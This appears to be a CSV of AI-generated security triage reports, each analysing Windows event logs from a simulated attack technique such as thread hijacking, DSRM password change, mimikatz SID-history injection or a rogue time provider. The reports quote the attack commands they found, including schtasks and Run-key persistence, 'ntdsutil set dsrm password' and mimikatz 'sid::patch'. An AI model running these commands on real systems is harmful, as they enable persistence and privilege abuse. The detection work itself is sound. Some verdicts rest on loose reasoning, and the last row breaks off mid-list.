Directory Name,AI Response
Thread Execution Hijacking,"### Assessment

On reviewing the provided Windows event logs, here is a detailed analysis:

#### Windows PowerShell Log

1. **Suspicious PowerShell Command**: All PowerShell events indicate a script executed with the command line `powershell.exe & {$notepad = Start-Process notepad -passthru; Start-Process ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\bin\\InjectContext.exe""; Start-Sleep -Seconds 5; Stop-Process $notepad.id}`.
   
   - **Significance**:
     - The use of `Start-Process` to execute `InjectContext.exe` from a temporary directory is suspicious. Temporary directories are frequently used as staging areas for malicious executables.
     - The approach of using Notepad as a process and stopping it after five seconds can be an attempt to hide malicious activity within typical-looking behavior.

#### Sysmon Logs

1. **Process Execution**: Multiple legitimate executables like `HOSTNAME.EXE`, `conhost.exe`, `whoami.exe`, and `wevtutil.exe` were recorded, which generally don’t raise immediate flags. However, the presence of the suspicious PowerShell command suggests these executions need scrutiny, especially around their timing (all recorded closely around 10:27 AM on 2024-11-02).

2. **PowerShell Execution**:
   - Log entry supports the PowerShell command where `InjectContext.exe` was executed, coinciding with PowerShell logs. The presence of this execution directly supports the suspicious narrative.

#### Security Logs

1. **Security Privileges**:
   - Logs show that the `admin_test` account had elevated privileges, with rights like `SeDebugPrivilege`, which can be used to manipulate system resources or bypass security checks.

2. **Authentication Events**:
   - The sequence of Logon (Event ID 4624) and Privilege Use (Event ID 4672) events suggest standard but privileged activities. However, given the context, the privileges and the actions look more suspicious than typical use.

#### Application and System Logs

- **Software Protection Event**: The SPP log (`Event ID 16384`) and no particularly revealing information in the System logs don't directly show anything malicious, but the high-level context implies other covert activities.

### Conclusion

The activities in these logs suggest **anomalous behavior through the execution of PowerShell scripts** that execute suspicious binaries. The use of elevated privileges and spawning processes from the temporary directory align with tactics used for compromising a system.

### Resolution

**Resolution: MALICIOUS**

- **Indicators** support a malicious label due to:
  - Executing `InjectContext.exe` from a temporary path via PowerShell.
  - Elevated privileges and potential stealth tactics using legitimate processes.

### Recommendation

- Conduct a forensic analysis on `Server002`, focusing on:
  - The suspicious `InjectContext.exe` binary.
  - Review of all processes initiated by `powershell.exe`.
  - Comprehensive check for other PowerShell scripts or malware remnants.
- Investigate the `admin_test` account for unauthorized activities and potential compromise.
- Implement monitoring for unusual PowerShell activity and tighten script execution policies.

Consider reporting and escalating as per corporate incident response protocol."
Dirty Vanity process Injection,"Upon analyzing the event logs provided, several observations and potential indicators of malicious activity are noted:

1. **Unusual PowerShell Activity**:
   - The PowerShell logs indicate the execution of a potentially suspicious command: `powershell.exe & {Start-Process ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\x64\\redVanity.exe"" (Start-Process calc.exe -PassThru).Id}`.
   - The location `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\x64\\redVanity.exe` appears unusual due to the path and the use of the temporary directory, which is often abused by malicious actors to run unauthorized applications.
   - Additionally, the execution of `calc.exe` during this PowerShell activity does not seem to serve any legitimate purpose and might be used to mask or test payload execution.

2. **System Time Manipulation**:
   - There are multiple events related to changes in system time (event IDs from the Security log `4616` and Kernel-General `1`), and these changes were influenced by `\\Device\\HarddiskVolume2\\Windows\\System32\\svchost.exe`.
   - Unexpected time changes can be indicators of an attacker's attempt to cover tracks by tampering with time-based security logs.

3. **Sysmon Logs**:
   - The Sysmon logs show multiple instances of legitimate processes executing, such as `wevtutil.exe`, `svchost.exe`, and `conhost.exe`, largely under the user `SERVER002\\admin_test` and `NT AUTHORITY\\SYSTEM`.
   - It is crucial to confirm whether the administrative activities correspond with legitimate maintenance tasks, as they could be leveraged by attackers to escalate privileges or achieve persistence.

4. **Security Log Events**:
   - There is an evidence of `4672` events indicating admin privileges being exercised by `admin_test`. This may require verification to ascertain normal operations.

**Assessment**:
The presence of unusual PowerShell activity, particularly running unfamiliar executables from a temporary directory and tampering with system time, stand out as significant anomalies. These activities deviate from typical, benign behavior and might indicate potential compromise or malicious activity.

**Final Resolution**: **SUSPICIOUS**

**Guidance**:
- Conduct a deeper forensic investigation focused on the identified suspicious PowerShell commands and the files involved (`redVanity.exe` and `calc.exe`) to determine their purpose and origin.
- Review and analyze the system user's behavior, `admin_test`, and confirm if activities during the mentioned time frame were legitimate.
- Evaluate the purpose of system time changes and confirm if these were authorized or if they align with any unexpected system behavior.
- Consider performing a comprehensive malware scan and security audit on the system to ensure integrity and rule out additional compromise vectors."
Process injection ListPlanting,"Upon reviewing the provided event logs, we can draw the following analysis and conclusion:

### Analysis:

1. **Suspicious PowerShell Activity**:
   - Several Sysmon and PowerShell logs indicate the execution of a PowerShell command with arguments that start another executable from a temporary directory: `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.015\\bin\\ListPlanting.exe""`. The use of PowerShell to execute binaries from a user's temporary folder is a common indicator of potential malicious activity, often employed by attackers to run payloads.
   - The command also involves actions such as sleeping and stopping a Notepad process, which can be part of a script-based payload execution or exploited functionality for persistence or stealth.

2. **User Activity**:
   - The logs show activities under the user “SERVER002\\admin_test”, who has been assigned high privileges including `SeDebugPrivilege`, which can be potentially abused for malicious purposes such as privilege escalation and process injection.
   - Two login events (EventID 4624) and associated privilege assignment events (EventID 4672) suggest that there are valid logon sessions with elevated privileges for user “admin_test”; however, it is crucial to verify if this activity aligns with expected administrative tasks.

3. **Process Creations**:
   - Common system processes such as `wevtutil.exe`, `conhost.exe`, and `hostname.exe` are logged, which are expected but continue to involve the elevated user ""SERVER002\\admin_test"".
   - The processes related to Microsoft Edge updates seem legitimate, consistent with routine software maintenance tasks typically run by the system (`User: NT AUTHORITY\\SYSTEM`).

4. **Network Activity**:
   - A network logon type (type 3) is recorded for the user ""admin_test"" in the security log, which seems typical for network connections. However, the absence of clear context about connection origin makes it imperative to verify if this is an authorized remote access.

### Conclusion:

- **Resolution: SUSPICIOUS**

The logs contain activity that could indicate a potential compromise, specifically related to the PowerShell execution pattern involving a temporary directory that launches an unfamiliar executable. While this might be part of a legitimate administrative or software behavior under certain circumstances, it warrants further investigation due to the potential for abuse in malware scenarios.

### Recommendations:

- **Immediate Investigation**: Verify the legitimacy of the executable `ListPlanting.exe`. Determine its origin and purpose, and whether the actions it performs align with expected user or application behavior.
- **Credential and Privilege Audit**: Review the privileges and recent activities of the ""admin_test"" user account to ensure it's not compromised. Validate if the `SeDebugPrivilege` and others are necessary for their role.
- **System Integrity Check**: Check the system integrity for indicators of compromise. Look for additional artifacts in program execution or registry changes that may suggest an underlying threat.
- **Monitoring and Alerts**: Increase monitoring for similar PowerShell executions or activities involving unusual system commands, especially in temporary or user-space directories.

Proceed with further investigation to determine the intent and implications of the identified anomaly."
Parent PID Spoofing - Spawn from Specified Process,"Upon reviewing the provided log entries across System, Application, Windows PowerShell, Security, and Sysmon logs, here is the detailed analysis:

### System Log Analysis:
1. **Windows Update Events (Event ID 44):**
   - Numerous events related to Windows Update activities, specifically updating Microsoft applications like Windows Camera, .NET libraries, and Microsoft YourPhone. These appear to be legitimate update activities without evidence of tampering or suspicious activity.

2. **Kernel-General Events (Event ID 16):**
   - Indicate the opening of various registry hives, notably related to application repositories and activation stores. These activities align with typical system operations and update processes.

### Windows PowerShell Log Analysis:
- **PowerShell Execution (Event ID 600 and 400):**
  - Execution of PowerShell with commands related to process creation under a specific parent, indicative of scripted automation or testing behavior.
  - Command to check `.inf` files for specific installation sections. This behavior can be considered unusual in regular user activities but not necessarily malicious without further context.

### Security Log Analysis:
1. **Credential Manager Activity (Event ID 5379):**
   - Shows multiple attempts to interact with MicrosoftAccount and WindowsLive tokens. Return codes suggest access was denied or unsuccessful, which can occur during normal account synchronization attempts or misconfigurations.
   
2. **Logon Success (Event ID 4624) and Special Privilege Assignment (Event ID 4672):**
   - System logon with elevated privileges, displaying typical high-level system privileges. Given the timing aligns with standard system processes (e.g., Windows Update), it doesn't immediately suggest compromise.

### Sysmon Log Analysis:
1. **Process Creation (Event ID 1 and 5):**
   - Several legitimate processes were executed, such as PowerShell, Hostname, Whoami, Edge installation processes, and telemetry processes (CompatTelRunner), executed mainly by NT AUTHORITY\SYSTEM or admin accounts, suggesting regular administrative activity rather than unauthorized access.
   - PowerShell executions with potential to indicate scripting or automation tasks. However, without additional context or evidence of malicious intent, they align with administrative or management tasks.
   
2. **Microsoft Edge Update Activity:**
   - Indicates update and installations related to Microsoft Edge, potentially conducted through automated systems given the service-level executions.

### Overall Assessment:
- **No conclusive evidence of malicious activities:** The logs primarily show routine system operations, application updates, and administrative script automation that may seem unusual but are not indicators of compromise without further context or corroborating malicious intent.
- **Potential points for further investigation:** PowerShell activities due to the use of script automation and credential errors in the security log should be examined further in a broader context to rule out potential misuse.

### Conclusion:
**Resolution - BENIGN:**
The logs contain benign activities primarily related to routine updates and system maintenance tasks without clear indications of malicious behavior. However, it is prudent to remain vigilant and continue to monitor for any other anomalies that might align with these activities to ensure system integrity."
Driver Installation Using pnputil.exe,"After reviewing the provided logs, several points of interest need attention:

1. **Process Executions:**
   - Multiple instances of PowerShell execution with the command: `powershell.exe & {pnputil.exe -i -a C:\Windows\INF\acpipmi.inf}`. Although `pnputil.exe` is a legitimate Windows utility, its use can be suspicious if not verified as intended administrative activity. This command is often used for driver installations which, if unintended, could indicate unauthorized changes to the system.
   - The execution of `whoami.exe` and `hostname.exe` are benign in isolation. They're often used in scripts or during troubleshooting to verify user and system context.

2. **Indicators of User Activity:**
   - The `admin_test` account is engaged in several activities, including the execution of administrative utilities like PowerShell and Sysmon logs indicating actions under this account with a high integrity level, suggesting potential administrative privilege use.

3. **Privilege Escalation:**
    - The Security log (Event 4672) indicates the assignment of high privileges (e.g., SeDebugPrivilege, SeLoadDriverPrivilege). While this would be expected for an administrative user, it is essential to verify that the `admin_test` account's usage aligns with expected administrative practices.

4. **Microsoft Edge Update:**
   - Frequent creation of processes related to Microsoft Edge updates is present. The process chains and actions appear typical for software auto-update actions, given their association with Microsoft services and the usage under NT AUTHORITY\SYSTEM.

5. **Event Consolidation:**
   - The logs present a series of seemingly administrative activities including the use of PowerShell and `pnputil.exe` by the `admin_test` user, without explicit system admin logs or tickets indicating these actions. Noteworthy, is the creation of numerous EdgeUpdate-related executables and service manipulations typical of update mechanisms.

6. **Security Observations:**
    - The logs mention NTLM logons, potentially indicating remote access that should be assessed to verify legitimate use.

**Assessment & Resolution:**

- The actions involving PowerShell and pnputil, while not inherently malicious, warrant further investigation to confirm they align with expected administrative tasks. 
- The combination of high-privilege escalation and the execution of administrative commands makes these events **SUSPICIOUS**.
- Immediate action: Verify the legitimacy of the user actions (e.g. admin_test use of PowerShell and pnputil commands) by consulting with the administration team or consulting relevant system management logs.
- Ensure all administrative actions are logged and correlate these with internal change management to rule out unauthorized activity.

Resolution: **SUSPICIOUS** - Activity needs further investigation to confirm legitimate use or potential compromise."
Launch NSudo Executable,"The analysis of the provided Windows event logs points to several notable observations that suggest suspicious activity potentially indicating malicious intent:

1. **PowerShell Activity and Process Execution:**
   - The `PowerShell` logs indicate the execution of script using `NSudoLG.exe` with the command `-U:T -P:E cmd`. This usage involves executing a process with elevated privileges, without proper justification or business need, which is generally seen as highly suspicious, particularly in environments with tight security controls.
   - The use of `Start-Process`, followed by `Stop-Process` commands in succession can also suggest an attempt to mask activity or quickly execute a high-privileged task.

2. **Credential Validation Failure - Security Events 5379:**
   - Numerous credential-related validation failures are noted, especially concerning `MicrosoftAccount:user=02txoixylodcstop`. These repeated failures could indicate attempts of unauthorized access or brute force attacks.

3. **Account Enumeration - Security Event 4798:**
   - Multiple accounts are being queried or enumerated through `taskhostw.exe`. While this might be normal administrative activity, frequent or unexpected queries suggest insider reconnaissance or preparatory steps for privilege escalation attacks.

4. **Sysmon Log Analysis:**
   - Analyzing the Sysmon log, several instances of PowerShell and other command-line tools being executed by the account `SERVER002\\admin_test` were noted. Command-line tools are often favored by threat actors for exploration, data collection, and security circumvention due to their versatility.
   - Processes like `wevtutil.exe`, often used to manage the event log (e.g., clearing logs), being triggered could hint towards attempts to manipulate or erase traces of the attack.
   - Unusual or unexpected presence of processes like `CompatTelRunner.exe` running in quick succession can be disregarded unless confirmed, as these can generally be part of Windows Telemetry when under control by Microsoft.

5. **Application Logs:**
   - Windows Defender is logged as active during these times, which provides baseline protection. However, its detection capabilities were not triggered in these logs, suggesting evasive activities or the possibility of insiders circumventing existing protections.

### Assessment and Guidance:

- **Resolution:** **SUSPICIOUS**
  - The logs show activities that are out of norm and suggest potential preparatory actions for a compromise. The presence of elevated executions and account access related events suggest potential risk.
  - Additional investigation is warranted, particularly focusing on user activities linked to the PowerShell commands and process executions.
  - Review logs and access trace files for anomalies around known and whitelisted applications.
  - Ensure that Windows Defender and other intrusion detection systems events are cross-attested for false negatives.
  - Conduct user access reviews and enforce MFA if available, particularly for all admin-related accounts.

The reported suspicious activities, if not a part of legitimate administrative maintenance or verified security operations, may indicate an unauthorized activity potentially setting the stage for a breach. Further investigation and monitoring are recommended."
Scheduled Task Startup Script,"After thoroughly reviewing the provided Windows event logs, here is a detailed analysis:

### Indicators of Suspicious or Malicious Activity:

1. **Scheduled Task Creation**:
   - The `cmd.exe` process is observed executing a command to create scheduled tasks: 
     ```
     schtasks /create /tn ""data_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"" 
     schtasks /create /tn ""data_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""
     ```
   - These tasks execute `calc.exe`, typically a benign program, but using it in this manner is unusual and could indicate an attempt to mask malicious activity.

2. **Process Execution**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` executed by `SERVER002\admin_test` without clear context or preceding events to justify their execution.
   - While these are system utilities, their execution in a burst could be abnormal, especially if not linked to routine administrative tasks.

3. **Use of High-Integrity Level**:
   - The executed processes (`whoami.exe`, `cmd.exe`, `schtasks.exe`) run with high integrity, indicating elevated privileges.
   - The high integrity level, combined with task scheduling, elevates the risk level of these operations.

4. **Process Parent-Child Relationships**:
   - Processes like `whoami.exe` and `cmd.exe` have `wsmprovhost.exe` as their parent, suggesting they were likely executed during a Windows Remote Management (WinRM) session. This could be typical but may signify an external or automated execution if not correlating with routine system administration activity.

### Conclusion and Resolution:

- **Assessment**:
  - The creation of scheduled tasks to run applications like `calc.exe` at logon and startup is a known technique for persistence often used in the context of malicious operations.
  - The execution of multiple system utilities (`wevtutil.exe`, `conhost.exe`, `whoami.exe`) by the same user in quick succession, especially within the context of potentially automated or remote-driven tasks, demands closer scrutiny to ensure it aligns with legitimate administrative activities.

- **Resolution**: **SUSPICIOUS**

### Guidance on How to Proceed:

1. **Further Investigation**:
   - Verify with the server's administration team if the scheduled tasks were part of a legitimate automation or testing script. If not, this warrants concern for potential unauthorized access.
   - Review access logs, especially for WinRM sessions and any anomalies related to user `admin_test`.

2. **Inspection of Automation Scripts**:
   - Check for any script executions or automation tools that may have triggered these commands as part of a legitimate workflow.

3. **Monitor and Contain**:
   - Conduct further monitoring for any new scheduled tasks or unexpected high-integrity-level commands.
   - If suspicious activities continue without legitimacy confirmation, consider isolating the host for a thorough forensic analysis.

4. **Consult Threat Intelligence**:
   - Check threat intelligence sources for any known campaigns utilizing similar IoCs (Indicators of Compromise).

This analysis suggests the necessity for further investigation to rule out any compromise or to reveal deliberate malicious attempts on this system."
Password Change on Directory Service Restore Mode (DSRM) Account,"Upon analysis of the provided logs, there are several factors that stand out and suggest a need for further investigation into potential malicious activity.

### Analysis of Logs

1. **Sysmon Logs:**
   - The logs show multiple executions of `wevtutil.exe` and `conhost.exe` from the account `SERVER002\admin_test`. While both `wevtutil.exe` and `conhost.exe` are legitimate Windows utilities, used respectively for managing event logs and hosting console windows, frequent and rapid consecutive executions, as seen here, could suggest script- or malware-driven activity.
   - `wevtutil.exe` can be used by attackers for tampering with event logs to cover tracks. Multiple quick invocations might suggest a scripted command execution that's worth looking into.
   - The execution of `cmd.exe` with the command line argument that includes `ntdsutil ""set dsrm password"" ""sync from domain account %username%"" ""q"" ""q""` is particularly suspicious. This command suggests manipulation of the DSRM (Directory Services Restore Mode) password, which is a critical security concern. An unusual modification operation like this could indicate an attempt to gain elevated privileges or persist in the Active Directory environment.

2. **Security Logs:**
   - Events `4624` and `4672` indicate a logon with elevated privileges (SeDebugPrivilege, SeBackupPrivilege, SeRestorePrivilege, etc.) by the account `SERVER002\admin_test`. While this account could be performing legitimate administrative tasks, elevated token privileges should be treated with caution. The use of these privileges presents a potential risk for privilege escalation, and given the other suspicions seen, this could indicate misuse.

3. **System Logs:**
   - There seems to be minor time synchronization adjustments, though these alone don't necessarily suggest malicious activity. However, combined with suspicious user activity, time changes could theoretically be used to evade timestamp-based detection in logs.

4. **General Observations:**
   - The use of admin-level commands to change DSRM passwords is highly sensitive and generally not a routine operation, especially not something expected in such a repetitive and scripted manner.
   - The activity occurs within a very short timeframe, which suggests automation.

### Assessment & Recommendation

Given the combination of:
- Rapid, frequent executions of wevtutil.exe.
- Highly elevated privilege usage.
- Suspicious command execution modifying DSRM password.
- Use of legitimate tools in potentially suspicious contexts.

I would assess the logs as **SUSPICIOUS**. 

This activity doesn't provide sufficient evidence to label it as undeniably malicious without further investigation, but it is certainly atypical and concerning enough to warrant immediate follow-up actions.

### Guidance

1. **Immediate Actions:**
   - Isolate the host `Server002` network to prevent lateral movement or further potential compromise.
   - Monitor the server for any active connections or additional new unusual activities.
   - Conduct a detailed review of recent account activities related to `admin_test`.

2. **Follow-up Investigation:**
   - Investigate the source of `ntdsutil` command execution and check for unauthorized changes.
   - Verify the integrity and current state of event logs for any tampering.
   - Check for potential indicators of compromise or persistence mechanisms that could be leveraged through elevated privileges.
   - Evaluate server/application level logs to corroborate or refute potential malicious activity.
  
3. **Preventive Measures:**
   - Review and audit privileged accounts, ensuring least privilege principle is enforced.
   - Adjust monitoring and alerting rules to detect rapid command executions and sensitive task executions.
   - Consider additional security training for administrators to recognize the patterns and steps often associated with a sophisticated attack sequence. 

This assessment indicates a significant level of risk, and proactive measures should be taken to ensure the integrity of server operations and security posture."
Injection SID-History with mimikatz,"Upon reviewing the provided event logs, I have identified some elements that suggest suspicious activity which requires further investigation. Here is an analysis of the findings:

1. **Anomalous Process Execution**: 
   - **Cmd.exe Invocation**: The execution of `cmd.exe` with the command line `echo C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\script\x64\script.exe` is suspicious, especially since it references a file path using a tilde (`~`) which is commonly seen with path truncation, generally used in potentially obfuscated scripts or older software environments. Furthermore, `cmd.exe` was later used with a command line to execute the script within that path along with privilege manipulation related commands like `privilege::debug`.

2. **Potential Privilege Escalation**:
   - The use of `privilege::debug` in the command line is typically indicative of an attempt to escalate privileges. This parameter is often seen in tools like Mimikatz, known for credential dumping and privilege escalation.

3. **Suspicious Script Paths**:
   - The activity surrounding paths like `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\script\x64\script.exe` might suggest an attempt to execute a script possibly downloaded or staged on the host machine for malicious intent.

4. **Wevtutil.exe Executions**:
   - Wevtutil, a command-line utility used to manage event logs, has been executed multiple times in quick succession. This might suggest attempts to clear or manipulate event logs to cover tracks.

5. **Abuse of Conhost.exe**:
   - Numerous instances of conhost.exe, which hosts the command prompt and its associated utilities in modern Windows operating systems, were executed. The sheer number of these instances suggests that scripts or commands might be running shell commands in the background.

6. **Non-standard Parent-child Process Relationships**:
   - Processes like `hostname.exe` and `whoami.exe` exhibit unusual parent-child relationships, with parent processes being wsmprovhost.exe. This can sometimes happen if a remote PowerShell session triggers these commands, suggesting possible remote access or scripting activity operating under the radar.

7. **Unusual Script Execution and Commands**:
   - The command line arguments like `sid::patch` and `sid::add` point toward attempts to modify security identifiers, possibly disrupting or modifying user group memberships and privileges.

**Assessment**: Based on these observations, particularly the combination of suspicious execution of cmd.exe with known privilege manipulation commands, repeated and unusual use of wevtutil.exe, and possible remote command executions, there is potential evidence of compromise or malicious activity. Such elements point towards an attack possibly leveraging lateral movement, privilege escalation, or data exfiltration techniques.

**Resolution**: SUSPICIOUS - There's enough evidence in the logs to warrant further investigation. The following steps are recommended:
- Perform a deeper forensic analysis to retrieve the exact script or binary executed at `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\script\x64\script.exe`.
- Investigate the user `SERVER002\admin_test` activities and any privileged actions or anomalies.
- Check the network logs for connections to unknown or suspicious external addresses.
- Review the machine for any recent software installations or changes in configurations.
- Consider isolating the host for a more detailed forensic examination.

Overall, these logs should not be dismissed without closer inspection due to the critical indicators present."
Create a new time provider,"Upon reviewing the provided logs, several activities stand out that suggest potential malicious behavior:

1. **Windows PowerShell Log Analysis:**
   - A series of PowerShell commands executed indicate attempts to tamper with the Windows Time Service (`w32time`). The commands include stopping the time service, copying a DLL file (`fileTest.dll`) from a temporary path to a public location, and adding registry entries with `reg add` for a new time provider called `fileTest`. This may indicate an effort to establish persistence or execute arbitrary code via the system's time provider mechanism, which is a known tactic used by malware.

2. **System and Sysmon Log Analysis:**
   - The Sysmon logs corroborate the PowerShell activities, showing the execution of `net.exe`, `reg.exe`, and `whoami.exe` commands, all linked to the same script. Each of these commands is operating at a high integrity level, likely indicating administrative privileges were used. This elevates the risk, as these actions by a potentially unauthorized script could compromise the entire system.
   - The System logs show a failure related to a time provider, which aligns with the PowerShell commands indicating the creation of a fraudulent time provider.

3. **Security Log Analysis:**
   - There is an event (ID 4616) signaling a change in system time, executed by `LOCAL SERVICE`. Time tampering can be a tactic to evade detection or align system logs for other malicious activities.

The combination of these logs presents a compelling case for malicious activity:

- The use of PowerShell to alter system configurations (time service provider), copy potentially harmful files, and modify the registry suggests the presence of a sophisticated script trying to establish persistence or prepare the environment for additional compromises.
- Time modifications and manipulation of system services critical like `w32time` reflect common persistence techniques used by attackers to maintain access to the system or bootstrap further operations.

**Resolution: MALICIOUS**

Given the behavior observed in the logs, the actions align with known malicious tactics, techniques, and procedures (TTPs), emphasizing the need for immediate action to contain and remediate a potential compromise. 

**Guidance:**

1. **Immediate Response:**
   - Disconnect the affected machine from the network to prevent further potential spread or communication with malicious entities.
   - Perform a full malware scan on the system using updated antivirus and anti-malware tools.
   - Review and roll back unauthorized registry changes and service configurations, specifically focusing on `w32time`.

2. **Further Investigation:**
   - Gather more context on how the malicious script was introduced into the system (e.g., phishing, drive-by download).
   - Check if similar scripts or DLLs exist in unusual directories on other systems.

3. **System Hardening:**
   - Ensure that PowerShell logging is fully enabled, capturing command-line arguments.
   - Apply security patches and enforce least-privilege principles across the environment to mitigate similar future risks.

4. **Communication & Reporting:**
   - Inform appropriate personnel and teams about the compromise.
   - Consider notifying external partners or regulatory bodies if the malware has the potential to affect data privacy or security beyond your organization."
Process Injection with Go using UuidFromStringA WinAPI,"Upon evaluating the provided logs, I identified several key points for analysis:

### Analysis Summary

**1. Time Change Events:**
- There are multiple instances of Windows kernel general events (EventID 1 and 24) which indicate time adjustments have been made on the system. While such activity can be benign (e.g., due to time synchronization protocols or slight clock drifts), it might also hint at attempts to camouflage other actions or events.

**2. PowerShell Activity:**
- The PowerShell log shows a command being executed: `powershell.exe & {C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\bin\x64\UuidFromStringA.exe -debug}`. The use of a command from a temporary location, especially involving an uncommon executable like `UuidFromStringA.exe`, is unusual and could suggest lateral movement, malware execution, or scripting by an attacker.

**3. Sysmon Logs Indicating Process Execution:**
- We find the execution of processes such as `hostname.exe`, `whoami.exe`, and `wevtutil.exe` under the same user ""SERVER002\admin_test"". While processes like `hostname` and `whoami` can be used for enumeration purposes, `wevtutil.exe` is notably used for event log management, which can be leveraged by attackers to cover tracks.
- The `wevtutil.exe` and `conhost.exe` appearing in rapid succession may indicate event log tampering or unusual command-line usage patterns.

**4. Security Log:**
- The security audit success events (EventID 4616) surrounding time changes reinforce possibility that the time was deliberately altered. The `svchost.exe` process being responsible under a service account is typical but should be scrutinized in conjunction with other indicators.

### Context and Resolution

**Contextual Analysis:**
- The presence of power shell commands executing binaries from temporary directories is a significant red flag. Combined with the running of utilities that could serve in reconnaissance and track covering (`whoami`, `wevtutil`), there is an apparent pattern consistent with suspicious activity.

**Assessment:**
- **Resolution: SUSPICIOUS**

Based on these findings, the logs indicate a level of suspicious activity that warrants further investigation. Specifically, the usage of PowerShell to execute potential unauthorized binaries, along with time changes and possible log tampering, suggest potential compromise efforts that haven't been definitively categorized as malicious but are concerning enough to merit deeper analysis.

### Recommendations for Investigation

1. **Isolate the Host:** To prevent any ongoing compromise activities, consider isolating the system from the network while conducting further investigations.
2. **File Examination:** Analyze the file `UuidFromStringA.exe` residing in the temporary directory for any signs of malware.
3. **Log Integrity Check:** Verify the integrity of logs and search for anomalies surrounding the timestamps of interest.
4. **Review User Activities:** Conduct a detailed review of activities associated with the user `SERVER002\admin_test`, particularly around the time of suspicious events.
5. **Network Analysis:** Examine network logs or captures for unusual or unauthorized connections that could correlate to the timestamps of the suspicious activities.

This vigilance ensures preventive measures are taken before any confirmed compromise can escalate into a larger security event."
"Scheduled Task (""Ghost Task"") via Registry Key Manipulation","Analysis of the Provided Logs:

1. **Application Log:**
   - The entries from the Application log show that Windows Defender is on and running. This indicates that the system’s basic security product is active. There are no signs of errors or disablings here, which is typically a good sign that no malware has attempted to disable the security software.

2. **Sysmon Log Analysis:**
   - The Sysmon logs show a flurry of processes executed by the user `SERVER002\admin_test`. Key processes executed include `powershell.exe`, `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and unusually, batch commands involving `cmd.exe` with potentially suspicious command line arguments.

   - Notably:
     - **Powershell and CMD Usage:** The use of `powershell.exe` and `cmd.exe` with complex command lines is common in both administrative tasks and in malicious activities. The command line used under `cmd.exe` suggests execution of scripts from a local temp directory with references to possibly evasive execution (e.g., `script.exe` and `GhostTask.exe`), this raises suspicion.
     - **File Path and Command Line Arguments:** The presence of paths with `Temp` directories and embedded executable paths is often a characteristic of script-based malware or undesirable software.
     - **Wevtutil.exe Execution:** This utility is used to manage event logs. Frequent execution of wevtutil could indicate tampering with event logs to cover up activities.

3. **Sysmon and Parent Processes:**
   - The parent-child process relationship shows a series of executions that could suggest a scripted or automated task, potentially part of a legitimate administrative task but also aligned with sophisticated intrusion tactics.
   
4. **Edge Installer Execution:**
   - The execution of `MicrosoftEdgeUpdate` update processes indicates that edge was updating without direct correlation to malicious actions. This activity appears benign based on typical software update mechanisms.

Conclusion: 
- The logs primarily suggest activities that align with sophisticated administrative scripting or potentially unwanted automated tasks. The presence of scripts in local temp directories along with shell executions needs introspection.

Resolution:
- **Suspicious**: The set of logs suggests some potentially unwanted or unusual behavior that deserves further investigation. While there is no definitive evidence of malicious intent, the use of unconventional commands and script execution indicates a need for a deeper manual review of these systems to ensure they align with expected administrative operations.

Guidance to Proceed:
- Review the administrative activities conducted during this period and cross-reference with known good scripts and deployment activities.
- Investigate the specific files and scripts invoked in unusual paths, particularly in the Temp directory.
- Consider enhanced monitoring of the user accounts and processes associated with the observed activities."
HKCU - Policy Settings Explorer Run Key,"Based on the examination of the provided Windows event logs across different channels (System, Sysmon, Security, Application, and PowerShell), here is the detailed analysis of potential indicators of compromise or suspicious activity:

### Analysis:

1. **Time Change Events**: 
   - The logs show multiple events related to time changes executed by `svchost.exe`, which is a legitimate system process often used by Windows services. However, frequent or unexpected system time changes can sometimes mask malicious activity. The source associated is `time.windows.com`, a legitimate time source.
   
2. **Process Execution**:
   - The `Sysmon` logs indicate multiple executions of `whoami.exe` and `hostname.exe`. These are legitimate Windows utilities often used for diagnostic purposes. Their execution alone does not necessarily indicate malicious activity unless seen as part of a suspicious script or in context that doesn't align with typical user behavior.
   - Several instances of `wevtutil.exe` and `conhost.exe` are observed. While `conhost.exe` is legitimate, excessive use of `wevtutil.exe` can indicate attempts to clear logs, although there is no direct evidence of log clearing here.
   
3. **PowerShell Activity**:
   - A considerable concern arises from the PowerShell command observed. The command attempts to create a registry key:
     - **Command**: Creating a registry key at `HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run` with a value that points to `C:\Windows\System32\calc.exe`.
     - This behavior is indicative of persistence techniques used by malware, where a registry key in the Run directory will execute specified programs when Windows starts.
     - **Observation**: The intent to persistently launch `calc.exe` upon logon could either be benign or used as a placeholder for more malicious intent in the future.

4. **NT AUTHORITY Services**:
   - Execution of standard Windows services like `svchost.exe` and `sppsvc.exe` operating under NT AUTHORITY accounts appears normal without additional suspicious activities associated.

### Assessment:
- The majority of log events represent typical Windows operations with benign utilities. However, the PowerShell script activity involving registry modification for persistence is suspicious. This hints at potential attempts to establish a persistent presence on the system.

### Conclusion:
- **Resolution**: **SUSPICIOUS**
- **Action**: More detailed investigation is warranted:
  - **Immediate Action**: Verify the authenticity of the registry modification and review user behavior and legitimacy of the `admin_test` user executing these commands.
  - **Preventive Measures**: Conduct a review of recently installed software or changes in configurations that could explain this behavior.
  - **System Analysis**: Double-check system integrity for signs of compromise beyond evoking `calc.exe`, in case it's a placeholder or test for future malicious operations.
  
The activity should be further analyzed in the context of network traffic and user patterns to determine any underlying malicious intent."
Admin Account Manipulate,"Upon reviewing the provided logs, there are a few key observations and findings that indicate suspicious, potentially malicious activity.

### Key Observations:

1. **Time Alteration:**
   - There are events showing system time changes (`EventID 24` and `EventID 1` in the System log) where the time was altered backward slightly. This could be used to manipulate timestamps in logs for evasion purposes, although the backward shift is only by a couple of seconds.

2. **Unusual User Account Operations:**
   - PowerShell logs and Sysmon logs indicate that a PowerShell script executed a sequence that attempts to rename a local administrator account. The command line from the log reveals a PowerShell operation to rename a user with a script that randomly generates new names and possibly logs that it succeeded. This is a serious red flag, indicative of an account manipulation attack.

3. **Privilege Escalation:**
